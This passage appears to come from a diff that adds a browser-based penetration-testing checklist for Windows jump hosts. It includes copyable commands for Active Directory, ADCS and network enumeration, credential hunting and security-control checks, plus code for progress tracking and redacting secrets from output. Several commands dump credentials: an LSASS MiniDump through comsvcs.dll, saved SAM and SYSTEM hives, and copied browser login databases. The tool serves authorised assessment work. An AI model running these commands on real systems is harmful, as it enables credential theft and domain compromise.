+  {c:"findstr /s /i \"cpassword\" \\\\%logonserver%\\SYSVOL\\*.xml 2>nul"},
+  {c:"dir \\\\%logonserver%\\SYSVOL\\%userdnsdomain%\\Policies\\ /s /b 2>nul"},
+  {comment:"Get applied GPOs for this machine"},
+  {c:"gpresult /r"},
+  {c:"gpresult /z /h C:\\Windows\\Temp\\gpresult.html && start C:\\Windows\\Temp\\gpresult.html"}
+]},
+
+{id:17, priv:"low",
+title:"Check for ADCS (Active Directory Certificate Services)",
+why:"ADCS misconfigurations (ESC1-ESC8) allow privilege escalation to Domain Admin through certificate template abuse. Enumerating available certificate templates and CA configurations is the first step. ESC1 and ESC8 are the most common and easiest to exploit.",
+look:"Look for: Certificate templates with Enrollee Supplies Subject + Client Authentication EKU (ESC1). Web enrollment enabled on the CA (ESC8 — NTLM relay to ADCS). Templates with overly permissive enrollment rights.",
+cmds:[
+  {comment:"Check if ADCS is present in the domain"},
+  {c:"powershell.exe -c \"([adsisearcher]'(objectClass=pKIEnrollmentService)').FindAll() | ForEach-Object {$_.Properties.cn + ' - ' + $_.Properties.dnshostname}\""},
+  {comment:"List certificate templates (requires Certify or manual LDAP)"},
+  {c:"certutil -CATemplates 2>nul"},
+  {c:"certutil -v -template 2>nul | findstr /i \"Template\\|msPKI\\|Enroll\""},
+  {comment:"Check for web enrollment endpoint"},
+  {c:"powershell.exe -c \"([adsisearcher]'(objectClass=pKIEnrollmentService)').FindAll() | ForEach-Object {'http://' + $_.Properties.dnshostname + '/certsrv/'}\""}
+]},
+
+{id:18, priv:"low",
+title:"Enumerate domain trusts",
+why:"Domain trusts extend the attack surface beyond the current domain. A compromise in a trusted domain can leverage trust relationships to escalate or move laterally into the trusting domain. Jump hosts positioned at trust boundaries are particularly valuable pivot points.",
+look:"Look for: External trusts to other organisations. Forest trusts with SID history enabled (SID filtering disabled = forest-wide compromise possible). One-way trusts that may allow or restrict access.",
+cmds:[
+  {c:"nltest /domain_trusts"},
+  {c:"net view /domain"},
+  {c:"powershell.exe -c \"([adsisearcher]'(objectClass=trustedDomain)').FindAll() | ForEach-Object {$_.Properties.name + ' - Trust Direction: ' + $_.Properties.trustdirection + ' - Attributes: ' + $_.Properties.trustattributes}\""}
+]},
+
+{section:"Network & Lateral Movement"},
+
+{id:19, priv:"low",
+title:"Map network interfaces, routes, and DNS",
+why:"Network enumeration from a jump host reveals what internal subnets are reachable, what DNS resolves to (indicating services), and what the host's routing position is. Jump hosts are often multi-homed or sit on management VLANs with wider access than standard workstations.",
+look:"Look for: Multiple network interfaces indicating access to multiple segments. Routes to internal ranges not visible externally. DNS entries revealing internal service names and IPs.",
+cmds:[
+  {c:"ipconfig /all"},
+  {c:"route print"},
+  {c:"arp -a"},
+  {c:"netstat -ano"},
+  {c:"nslookup %logonserver%"},
+  {c:"ipconfig /displaydns | findstr /i \"Record Name\\|A (Host)\""}
+]},
+
+{id:20, priv:"low",
+title:"Enumerate open ports and listening services",
+why:"Services listening on the jump host may expose attack surface or indicate installed software with known vulnerabilities. Internal services bound only to localhost may be reachable through the jump host but not externally.",
+look:"Look for: Management services (WinRM 5985/5986, RDP 3389, WMI). Database services (MSSQL 1433, MySQL 3306). Web servers with admin interfaces. Services bound to 0.0.0.0 vs 127.0.0.1.",
+cmds:[
+  {c:"netstat -ano | findstr LISTENING"},
+  {c:"netstat -ano | findstr ESTABLISHED"},
+  {c:"powershell.exe -c \"Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess | Sort-Object LocalPort | Format-Table -AutoSize\""},
+  {c:"tasklist /svc /fo list | findstr /i \"svchost\\|service\""}
+]},
+
+{id:21, priv:"low",
+title:"Enumerate network shares",
+why:"Network shares on the jump host and accessible from it may contain sensitive files, scripts with hardcoded credentials, backup files, or executable paths writable by low-priv users. Shares inherited from GPO or deployed by software often have overly permissive ACLs.",
+look:"Look for: ADMIN$, C$ accessible — indicates admin equivalent access. Writable shares containing executable files. Shares with sensitive content — database backups, config files, deployment scripts.",
+cmds:[
+  {c:"net share"},
+  {c:"net view \\\\localhost"},
+  {c:"powershell.exe -c \"Get-SmbShare | Select-Object Name,Path,Description | Format-Table -AutoSize\""},
+  {comment:"Enumerate accessible shares on domain controllers"},
+  {c:"net view \\\\%logonserver% /all 2>nul"},
+  {comment:"Find writable shares using PowerView (if available)"},
+  {c:"powershell.exe -c \"Invoke-ShareFinder -CheckShareAccess 2>nul\""}
+]},
+
+{id:22, priv:"low",
+title:"Check RDP configuration and active sessions",
+why:"RDP is the primary use case for a Windows jump host. Active RDP sessions from this host to other systems show what the jump host operationally accesses, revealing further targets. RDP credential injection is also possible if SeImpersonatePrivilege or admin access is available.",
+look:"Look for: Active RDP sessions to other internal hosts — immediate lateral movement targets. RDP listening on non-standard ports. NLA disabled = credential-less brute force possible. Saved RDP files (.rdp) containing target hostnames and usernames.",
+cmds:[
+  {c:"query session"},
+  {c:"query user"},
+  {c:"netstat -ano | findstr \":3389\""},
+  {c:"reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections"},
+  {c:"reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication"},
+  {comment:"Find saved RDP files"},
+  {c:"dir C:\\Users\\*\\Documents\\*.rdp /s /a 2>nul"},
+  {c:"dir C:\\Users\\*\\Desktop\\*.rdp /s /a 2>nul"}
+]},
+
+{id:23, priv:"low",
+title:"Enumerate firewall rules",
+why:"Firewall rules reveal what traffic the host is permitted to send and receive — which services it is allowed to reach internally, and whether outbound connections from the jump host are unrestricted. Outbound rules are often less restrictive on jump hosts to enable administrative access to other systems.",
+look:"Look for: Outbound rules permitting all traffic — common on jump hosts. Inbound rules allowing RDP/WinRM from specific management subnets — reveals the management network range. Disabled firewall — common misconfiguration.",
+cmds:[
+  {c:"netsh advfirewall show allprofiles"},
+  {c:"netsh advfirewall firewall show rule name=all | findstr /i \"Rule Name\\|Direction\\|Action\\|Enabled\\|RemoteIP\""},
+  {c:"powershell.exe -c \"Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} | Select-Object DisplayName,Direction,Action,@{n='RemoteAddress';e={($_ | Get-NetFirewallAddressFilter).RemoteAddress}} | Format-Table -AutoSize\""}
+]},
+
+{section:"Credential Hunting"},
+
+{id:24, priv:"low",
+title:"Search for credentials in files and scripts",
+why:"Administrators and developers routinely store credentials in plaintext files, PowerShell scripts, batch files, and configuration files on jump hosts. Common patterns include deployment scripts, backup job configs, and monitoring agent configs.",
+look:"Look for: Any plaintext password string. Connection strings with embedded credentials. PowerShell scripts using ConvertTo-SecureString with hardcoded keys. Batch files passing credentials as arguments.",
+cmds:[
+  {c:"findstr /si \"password\" C:\\Users\\*.ps1 C:\\Users\\*.bat C:\\Users\\*.cmd C:\\Users\\*.txt 2>nul"},
+  {c:"findstr /si \"password\" C:\\inetpub\\*.config C:\\inetpub\\*.xml 2>nul"},
+  {c:"findstr /si \"connectionString\\|password\\|pwd\\|passwd\" C:\\*.config 2>nul"},
+  {c:"dir C:\\Users\\*\\.ssh\\ /s /a 2>nul"},
+  {c:"dir C:\\Users\\*\\.aws\\ /s /a 2>nul"},
+  {c:"type C:\\Windows\\Panther\\unattend.xml 2>nul"},
+  {c:"type C:\\Windows\\Panther\\Unattended.xml 2>nul"},
+  {c:"type C:\\Windows\\system32\\sysprep\\unattend.xml 2>nul"}
+]},
+
+{id:25, priv:"low",
+title:"Check browser and application stored credentials",
+why:"Browsers on jump hosts often store credentials for internal web applications, admin panels, and management interfaces. Chrome and Edge store credentials in an SQLite database encrypted with DPAPI — readable as the current user without admin access.",
+look:"Look for: Browser-saved passwords for internal admin panels, VPN portals, ITSM tools, or other internal applications. SSH key files in user profile directories. PuTTY/WinSCP saved sessions with stored passwords.",
+cmds:[
+  {comment:"Chrome credentials (DPAPI-encrypted, readable as current user)"},
+  {c:"powershell.exe -c \"$db = '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data'; if (Test-Path $db) {Copy-Item $db $env:TEMP\\chrome_creds.db; Write-Host 'Chrome DB copied'}\""},
+  {comment:"Edge credentials"},
+  {c:"powershell.exe -c \"$db = '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data'; if (Test-Path $db) {Copy-Item $db $env:TEMP\\edge_creds.db; Write-Host 'Edge DB copied'}\""},
+  {comment:"PuTTY saved sessions"},
+  {c:"reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions 2>nul"},
+  {c:"reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s 2>nul | findstr /i \"HostName\\|UserName\\|ProxyUsername\""},
+  {comment:"WinSCP stored sessions"},
+  {c:"reg query HKCU\\Software\\Martin Prikryl\\WinSCP 2 2>nul /s | findstr /i \"HostName\\|UserName\\|Password\""}
+]},
+
+{id:26, priv:"both",
+title:"Extract credentials from LSASS and SAM",
+why:"LSASS holds logon session credentials in memory including plaintext passwords (if WDigest is enabled), NTLM hashes, and Kerberos tickets for all interactively logged-on users. On a busy jump host this includes credentials of every administrator who has logged in. Requires SeDebugPrivilege — available to local administrators.",
+look:"Look for: Plaintext passwords if WDigest authentication is enabled (common on older systems). NTLM hashes for pass-the-hash attacks. Kerberos TGTs for pass-the-ticket. Credentials of domain admins who have logged into this host.",
+cmds:[
+  {comment:"Low-priv — check WDigest status (if enabled, LSASS stores plaintext passwords)"},
+  {c:"reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential"},
+  {comment:"Admin — dump LSASS with Task Manager (GUI) or comsvcs.dll (no extra tools)"},
+  {c:"powershell.exe -c \"$p = (Get-Process lsass).Id; rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump $p C:\\Windows\\Temp\\lsass.dmp full\""},
+  {comment:"Admin — dump SAM (local account hashes)"},
+  {c:"reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y"},
+  {c:"reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive /y"},
+  {comment:"Admin — check for backup SAM in shadow copies"},
+  {c:"vssadmin list shadows 2>nul"}
+]},
+
+{section:"Persistence & Backdoors"},
+
+{id:27, priv:"low",
+title:"Check for installed remote access tools",
+why:"Jump hosts often have legitimate remote access tools installed — AnyDesk, TeamViewer, VNC, ScreenConnect. These can be abused for persistence or as a secondary access channel. Unauthorised instances may indicate prior compromise.",
+look:"Look for: Remote access tools not in the asset inventory. Tools configured with unprotected access or without password authentication. VNC with weak/no passwords. Unexpected outbound connections to remote access relay servers.",
+cmds:[
+  {c:"wmic product get name,version | findstr /i \"anydesk\\|teamviewer\\|vnc\\|screenconnect\\|logmein\\|bomgar\\|dameware\\|radmin\""},
+  {c:"tasklist | findstr /i \"anydesk\\|teamviewer\\|vnc\\|screenconnect\\|logmein\""},
+  {c:"netstat -ano | findstr \":5900\\|:5901\\|:4444\\|:5938\""},
+  {c:"reg query HKLM\\SOFTWARE\\RealVNC 2>nul"},
+  {c:"reg query HKLM\\SOFTWARE\\TightVNC 2>nul"},
+  {c:"reg query HKLM\\SOFTWARE\\AnyDesk 2>nul"}
+]},
+
+{id:28, priv:"low",
+title:"Check WinRM and PowerShell Remoting configuration",
+why:"WinRM/PowerShell Remoting is frequently enabled on jump hosts for administrative automation. If enabled with loose ACLs, it provides a remote command execution channel. Checking trusted hosts reveals what other systems this host is trusted to connect to.",
+look:"Look for: WinRM enabled and listening — potential lateral movement channel. TrustedHosts set to * — the host accepts connections to any system without certificate verification. HTTPS listener absent — credentials transmitted over HTTP.",
+cmds:[
+  {c:"powershell.exe -c \"Get-WSManInstance -ResourceURI winrm/config 2>nul\""},
+  {c:"powershell.exe -c \"Get-Item WSMan:\\localhost\\Client\\TrustedHosts 2>nul\""},
+  {c:"netstat -ano | findstr \":5985\\|:5986\""},
+  {c:"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN 2>nul"}
+]},
+
+{id:29, priv:"both",
+title:"Check for persistence mechanisms",
+why:"After gaining access, attackers establish persistence through registry run keys, scheduled tasks, services, and WMI subscriptions. Checking these locations can reveal prior compromise or opportunities for establishing persistence as part of the engagement.",
+look:"Look for: Unusual autorun entries. Scheduled tasks with suspicious names or commands. WMI event subscriptions — a stealthy persistence mechanism rarely inspected. Services with non-standard names or paths.",
+cmds:[
+  {comment:"Registry persistence"},
+  {c:"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /s"},
+  {c:"reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /s"},
+  {comment:"WMI subscriptions — stealthy persistence"},
+  {c:"powershell.exe -c \"Get-WMIObject -Namespace root\\subscription -Class __EventFilter | Select-Object Name,Query\""},
+  {c:"powershell.exe -c \"Get-WMIObject -Namespace root\\subscription -Class __EventConsumer | Select-Object Name,CommandLineTemplate,ScriptText\""},
+  {comment:"Admin — list all services including stopped ones"},
+  {c:"sc query type= all state= all | findstr /i \"SERVICE_NAME\\|BINARY_PATH\\|STATE\""}
+]},
+
+{section:"Security Controls Assessment"},
+
+{id:30, priv:"low",
+title:"Check antivirus and EDR status",
+why:"Identifying installed security products determines what evasion may be required and what detection capabilities exist. AV status affects tool choice. EDR presence indicates a more mature security posture and requires more careful tradecraft.",
+look:"Look for: AV product name and version — check for known bypasses. Whether real-time protection is enabled or disabled. Exclusion paths — tools dropped in excluded directories will not be scanned.",
+cmds:[
+  {c:"powershell.exe -c \"Get-MpComputerStatus 2>nul | Select-Object AMServiceEnabled,AntispywareEnabled,AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled\""},
+  {c:"powershell.exe -c \"Get-MpPreference 2>nul | Select-Object ExclusionPath,ExclusionExtension,ExclusionProcess\""},
+  {c:"sc query windefend 2>nul"},
+  {c:"wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname,productstate,pathtoSignedProductExe /format:list 2>nul"},
+  {c:"tasklist | findstr /i \"sentinel\\|crowdstrike\\|cylance\\|carbon\\|defender\\|mcafee\\|symantec\\|sophos\\|trend\\|kaspersky\\|malwarebytes\""}
+]},
+
+{id:31, priv:"low",
+title:"Check UAC configuration",
+why:"UAC configuration determines how privilege elevation prompts are handled. ConsentPromptBehaviorAdmin=0 means no prompt for administrators — silently elevating without user interaction. This significantly widens the privilege escalation surface for any admin-level code execution.",
+look:"Look for: ConsentPromptBehaviorAdmin=0 = auto-elevate without prompt = UAC bypass trivial. EnableLUA=0 = UAC completely disabled. LocalAccountTokenFilterPolicy=1 = remote admin tokens not filtered = PTH more effective.",
+cmds:[
+  {c:"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA"},
+  {c:"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin"},
+  {c:"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy"},
+  {c:"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v FilterAdministratorToken"}
+]},
+
+{id:32, priv:"low",
+title:"Check PowerShell logging and AMSI configuration",
+why:"PowerShell logging configuration determines what offensive PowerShell activity is captured for blue team detection. AMSI (Antimalware Scan Interface) scans PowerShell scripts before execution. Understanding both determines appropriate evasion strategy.",
+look:"Look for: ScriptBlockLogging enabled — all PowerShell script content is logged to Event Log 4104. Transcription enabled — full PowerShell session transcripts written to disk. AMSI providers present — in-memory script scanning active.",
+cmds:[
+  {c:"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging 2>nul"},
+  {c:"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription 2>nul"},
+  {c:"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging 2>nul"},
+  {c:"powershell.exe -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') 2>nul\""},
+  {c:"powershell.exe -c \"$PSVersionTable\""}
+]},
+
+{id:33, priv:"low",
+title:"Check AppLocker and Software Restriction Policies",
+why:"AppLocker and SRP restrict which executables, scripts, and DLLs can run. Understanding the policy reveals what is blocked and what potential bypasses exist — LOLBAS techniques, trusted path bypasses, or writable allowed directories.",
+look:"Look for: Rules blocking execution from user-writable directories like %TEMP% or %APPDATA%. Script rules — may still allow execution from certain paths. Absence of DLL rules — common AppLocker gap that allows DLL-based bypasses.",
+cmds:[
+  {c:"powershell.exe -c \"Get-AppLockerPolicy -Effective 2>nul | Format-List\""},
+  {c:"powershell.exe -c \"Get-AppLockerPolicy -Effective 2>nul | Test-AppLockerPolicy -Path C:\\Windows\\System32\\cmd.exe -User Everyone\""},
+  {c:"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2 2>nul"},
+  {c:"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Safer 2>nul"}
+]},
+
+{section:"Additional Checks"},
+];
+
+// ── Custom checks ──────────────────────────────────────
+let customChecks = [];
+
+function addCustomCheck() {
+  customChecks.push({title:'', note:'', done:false});
+  save(); renderCustomChecks();
+}
+function removeCustomCheck(idx) {
+  customChecks.splice(idx, 1);
+  save(); renderCustomChecks();
+}
+function customTitleChange(idx) {
+  customChecks[idx].title = document.getElementById('ctitle-' + idx).value;
+  save();
+}
+function customNoteChange(idx) {
+  customChecks[idx].note = document.getElementById('cnote-' + idx).value;
+  save();
+}
+function tickCustom(idx) {
+  customChecks[idx].done = !customChecks[idx].done;
+  document.getElementById('crow-' + idx).classList.toggle('done', customChecks[idx].done);
+  document.getElementById('ccbm-' + idx).classList.toggle('on', customChecks[idx].done);
+  save();
+}
+function manualRedactCustom(idx) {
+  const el = document.getElementById('cnote-' + idx);
+  if (!el) return;
+  const s = el.selectionStart, e = el.selectionEnd;
+  if (s === e) { alert('Select text to redact first.'); return; }
+  el.value = el.value.substring(0,s) + snip(el.value.substring(s,e)) + el.value.substring(e);
+  customChecks[idx].note = el.value;
+  save();
+}
+function renderCustomChecks() {
+  const el = document.getElementById('custom-checks');
+  if (!el) return;
+  let html = '';
+  customChecks.forEach((cc, idx) => {
+    const safeTitle = cc.title.replace(/"/g,'&quot;');
+    const safeNote  = cc.note.replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    html += `<div class="step${cc.done?' done':''}" id="crow-${idx}" style="flex-direction:column;align-items:stretch;gap:6px;padding:10px 0">
+      <div style="display:flex;gap:10px;align-items:flex-start">
+        <div class="step-cb${cc.done?' on':''}" id="ccbm-${idx}" onclick="tickCustom(${idx})" style="margin-top:6px;flex-shrink:0"></div>
+        <input type="text" id="ctitle-${idx}" value="${safeTitle}" placeholder="Check title..."
+          style="flex:1;font-size:13px;font-weight:500;font-family:var(--sans);background:transparent;border:none;border-bottom:0.5px solid var(--border2);padding:4px 0;color:var(--text);outline:none"
+          oninput="customTitleChange(${idx})">
+        <button onclick="removeCustomCheck(${idx})" style="font-size:10px;padding:3px 8px;border-radius:5px;border:0.5px solid var(--border2);background:transparent;color:var(--text3);cursor:pointer;font-family:var(--sans);flex-shrink:0">Remove</button>
+      </div>
+      <div style="padding-left:26px">
+        <div class="out-label" style="margin-bottom:4px;display:flex;align-items:center;justify-content:space-between">Notes / Output<button class="cpbtn" onclick="manualRedactCustom(${idx})">Redact selection</button></div>
+        <textarea class="output-field" id="cnote-${idx}" placeholder="Describe the check, commands used, and findings..." oninput="customNoteChange(${idx})">${safeNote}</textarea>
+      </div>
+    </div>`;
+  });
+  html += `<div style="padding:10px 0 4px"><button onclick="addCustomCheck()" style="font-size:12px;padding:6px 14px;border-radius:7px;border:0.5px solid var(--border2);background:transparent;color:var(--text2);cursor:pointer;font-family:var(--sans)">+ Add check</button></div>`;
+  el.innerHTML = html;
+}
+
+const REFS = [
+  { cat:"Methodology & Checklists", items:[
+    {title:"HackTricks — Windows Local Privilege Escalation",url:"https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html",desc:"Comprehensive Windows privilege escalation reference covering all common vectors, misconfigurations, and token abuse techniques."},
+    {title:"PayloadsAllTheThings — Windows Privilege Escalation",url:"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md",desc:"Extensive collection of Windows privilege escalation techniques with working commands and examples."},
+    {title:"LOLBAS Project",url:"https://lolbas-project.github.io/",desc:"Living Off The Land Binaries and Scripts — Windows binaries that can be abused for execution, download, and evasion."},
+    {title:"WADComs — Windows / AD Command Reference",url:"https://wadcoms.github.io/",desc:"Interactive cheat sheet for offensive security tools and commands against Windows and Active Directory environments."},
+  ]},
+  { cat:"Active Directory", items:[
+    {title:"HackTricks — Active Directory Methodology",url:"https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html",desc:"End-to-end AD attack methodology covering enumeration, Kerberoasting, AS-REP roasting, ACL abuse, and domain compromise."},
+    {title:"SpecterOps BloodHound Documentation",url:"https://support.bloodhoundenterprise.io/hc/en-us",desc:"BloodHound attack path analysis documentation — understanding SharpHound data and interpreting attack paths."},
+    {title:"The Hacker Recipes — Active Directory",url:"https://www.thehacker.recipes/ad/",desc:"Structured AD attack technique reference covering initial access through domain persistence."},
+  ]},
+  { cat:"Credential Access", items:[
+    {title:"HackTricks — Stealing Credentials",url:"https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html",desc:"Windows credential theft techniques — LSASS, SAM, DPAPI, browser credentials, and credential manager."},
+    {title:"Mimikatz Documentation",url:"https://github.com/gentilkiwi/mimikatz/wiki",desc:"Official Mimikatz wiki covering all modules — sekurlsa, lsadump, kerberos, dpapi, and more."},
+  ]},
+  { cat:"Tools", items:[
+    {title:"WinPEAS",url:"https://github.com/peass-ng/PEASS-ng",desc:"Automated Windows privilege escalation enumeration — the Windows equivalent of LinPEAS."},
+    {title:"PowerUp",url:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1",desc:"PowerShell privilege escalation checker — service misconfigs, unquoted paths, AlwaysInstallElevated."},
+    {title:"Seatbelt",url:"https://github.com/GhostPack/Seatbelt",desc:"Host triage and situational awareness — credentials, tokens, running processes, security configurations."},
+    {title:"SharpHound / BloodHound",url:"https://github.com/BloodHoundAD/SharpHound",desc:"Active Directory attack path collection and visualisation."},
+    {title:"Mimikatz",url:"https://github.com/gentilkiwi/mimikatz",desc:"Credential extraction from LSASS, SAM, DPAPI, and Kerberos."},
+    {title:"LaZagne",url:"https://github.com/AlessandroZ/LaZagne",desc:"Application password recovery — browsers, VPN, SSH, Windows credential manager."},
+    {title:"GTFOBins / LOLBAS",url:"https://lolbas-project.github.io/",desc:"Windows binaries and scripts that can be leveraged for privilege escalation, persistence, and evasion."},
+  ]},
+  { cat:"ADCS & Certificate Abuse", items:[
+    {title:"Certified Pre-Owned — Will Schroeder & Lee Christensen",url:"https://posts.specterops.io/certified-pre-owned-d95910965cd2",desc:"The definitive research paper on ADCS privilege escalation — ESC1 through ESC8 techniques."},
+    {title:"Certipy Documentation",url:"https://github.com/ly4k/Certipy",desc:"Tool and documentation for ADCS enumeration and exploitation from Linux."},
+  ]},
+];
+
+// ── State ──────────────────────────────────────────────
+const TOTAL_STEPS = DATA.filter(s => s.id).length;
+const TOTAL_TOOLS = TOOLS_DATA.filter(t => t.tid).length;
+let state = {};
+let cmdState = {};
+let notes = {};
+
+function save() {
+  try { localStorage.setItem('wjac1', JSON.stringify({state, cmdState, notes, customChecks})); } catch(e) {}
+}
+function load() {
+  try {
+    const raw = localStorage.getItem('wjac1');
+    if (raw) { const d = JSON.parse(raw); state=d.state||{}; cmdState=d.cmdState||{}; notes=d.notes||{}; customChecks=d.customChecks||[]; }
+  } catch(e) {}
+}
+
+// ── Command store ──────────────────────────────────────
+const CMD_STORE = {};
+[...DATA, ...TOOLS_DATA].forEach(s => {
+  const key = s.id !== undefined ? s.id : s.tid;
+  if (!key) return;
+  (s.cmds||[]).forEach((item, idx) => {
+    if (item.c) CMD_STORE[key + '_' + idx] = item.c;
+  });
+});
+
+// ── Checkbox cascade ───────────────────────────────────
+function getCmdIndices(key) {
+  const all = [...DATA, ...TOOLS_DATA];
+  const s = all.find(x => (x.id !== undefined ? x.id : x.tid) == key);
+  if (!s || !s.cmds) return [];
+  return s.cmds.map((item,idx) => ({item,idx})).filter(({item}) => item.c).map(({idx}) => idx);
+}
+function setStepChecked(key, val) {
+  state[key] = val;
+  const row = document.getElementById('row-' + key);
+  const cb  = document.getElementById('scb-' + key);
+  if (row) row.classList.toggle('done', val);
+  if (cb)  cb.classList.toggle('on', val);
+}
+function setCmdChecked(key, idx, val) {
+  const ckey = key + '_' + idx;
+  cmdState[ckey] = val;
+  const cb   = document.getElementById('ccb-' + ckey);
+  const code = document.getElementById('ccode-' + ckey);
+  if (cb)   cb.classList.toggle('on', val);
+  if (code) code.classList.toggle('cmd-done', val);
+}
+function tickStep(key) {
+  const newVal = !state[key];
+  setStepChecked(key, newVal);
+  getCmdIndices(key).forEach(idx => setCmdChecked(key, idx, newVal));
+  updateBar(); save();
+}
+function tickCmd(key, idx) {
+  const ckey = key + '_' + idx;
+  const newVal = !cmdState[ckey];
+  setCmdChecked(key, idx, newVal);
+  const allIndices = getCmdIndices(key);
+  if (allIndices.length > 0) {
+    const allDone = allIndices.every(i => !!cmdState[key + '_' + i]);
+    if (allDone && !state[key]) setStepChecked(key, true);
+    if (!newVal && state[key]) setStepChecked(key, false);
+  }
+  updateBar(); save();
+}
+function noteChange(nkey) {
+  notes[nkey] = document.getElementById('note-' + nkey).value;
+  save();
+}
+function updateBar() {
+  const doneSteps = DATA.filter(s => s.id && state[s.id]).length;
+  const doneTools = TOOLS_DATA.filter(t => t.tid && state[t.tid]).length;
+  const total = TOTAL_STEPS + TOTAL_TOOLS;
+  const done  = doneSteps + doneTools;
+  document.getElementById('pf').style.width = Math.round(done/total*100) + '%';
+  document.getElementById('pl').textContent = done + ' / ' + total + ' complete (' + doneTools + ' tools, ' + doneSteps + ' checks)';
+}
+function cpCmd(btn) {
+  const text = CMD_STORE[btn.dataset.ckey] || '';
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent='Copied'; btn.classList.add('ok');
+    setTimeout(() => { btn.textContent='Copy'; btn.classList.remove('ok'); }, 1400);
+  }).catch(() => { btn.textContent='Error'; });
+}
+function resetAll() {
+  if (!confirm('Reset all checkboxes, command checkboxes, output notes, and additional checks?')) return;
+  state={}; cmdState={}; notes={}; customChecks=[];
+  document.querySelectorAll('.step').forEach(el => el.classList.remove('done'));
+  document.querySelectorAll('.step-cb').forEach(el => el.classList.remove('on'));
+  document.querySelectorAll('.cmd-cb').forEach(el => el.classList.remove('on'));
+  document.querySelectorAll('.code').forEach(el => el.classList.remove('cmd-done'));
+  document.querySelectorAll('.output-field').forEach(el => { el.value=''; });
+  updateBar(); save(); renderCustomChecks();
+}
+
+// ── Credential redaction ───────────────────────────────
+let redactEnabled = true;
+function toggleRedact() {
+  redactEnabled = !redactEnabled;
+  const track = document.getElementById('redact-track');
+  const thumb = document.getElementById('redact-thumb');
+  track.style.background = redactEnabled ? 'var(--green)' : 'var(--border2)';
+  thumb.style.left = redactEnabled ? '14px' : '2px';
+}
+function snip(val) {
+  if (!val || val.length <= 8) return '<--- REDACTED --->';
+  return val.slice(0,3) + '<--- REDACTED --->' + val.slice(-3);
+}
+function redactOutput(text) {
+  if (!redactEnabled || !text || text === '(no output recorded)') return text;
+  text = text.replace(
+    /(-----BEGIN [\w\s]+(KEY|CERTIFICATE|DSA|EC|RSA|OPENSSH PRIVATE KEY)-----\n)([\s\S]+?)(-----END [\w\s]+(KEY|CERTIFICATE|DSA|EC|RSA|OPENSSH PRIVATE KEY)-----)/g,
+    (_, beginLine, _t1, body, endLine) => {
+      const lines = body.split('\n').filter(l => l.trim() !== '');
+      if (lines.length <= 6) return beginLine + lines.map(() => '<--- REDACTED --->').join('\n') + '\n' + endLine;
+      return beginLine + [...lines.slice(0,3), '<--- REDACTED --->', ...lines.slice(-3)].join('\n') + '\n' + endLine;
+    }
+  );
+  return text.split('\n').map(line => {
+    if (/^\s*#|^\s*REM /i.test(line)) return line;
+    if (line.includes('<--- REDACTED --->')) return line;
+    line = line.replace(
+      /\b((?:password|passwd|secret|token|api[_\-]?key|access[_\-]?key|private[_\-]?key|auth[_\-]?token|bearer|jwt|credential|api[_\-]?secret|client[_\-]?secret|signing[_\-]?key|encryption[_\-]?key|db[_\-]?pass(?:word)?|database[_\-]?pass(?:word)?|mssql[_\-]?pass(?:word)?|mariadb[_\-]?pass(?:word)?|mysql[_\-]?pass(?:word)?|postgres[_\-]?pass(?:word)?|pgpassword|connectionstring|github[_\-]?token|gh[_\-]?token)[_\-]?\w*)\s*[=:]\s*['"]?([^\s'"]{3,})['"]?/gi,
+      (_, key, val) => `${key}=${snip(val)}`
+    );
+    line = line.replace(
+      /"(password|passwd|secret|token|apikey|api_key|access_key|private_key|auth|bearer|credential|client_secret|connectionstring)"\s*:\s*"([^"]{3,})"/gi,
+      (_, key, val) => `"${key}": "${snip(val)}"`
+    );
+    line = line.replace(/\b(AKIA[A-Z0-9]{16})\b/g, val => snip(val));
+    if (/\b(?:auth|Authorization|Bearer)\b/i.test(line)) {
+      line = line.replace(/([A-Za-z0-9+/]{30,}={0,2})/g, val => snip(val));
+    }
+    line = line.replace(/\b(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)\b/g, val => snip(val));
+    return line;
+  }).join('\n');
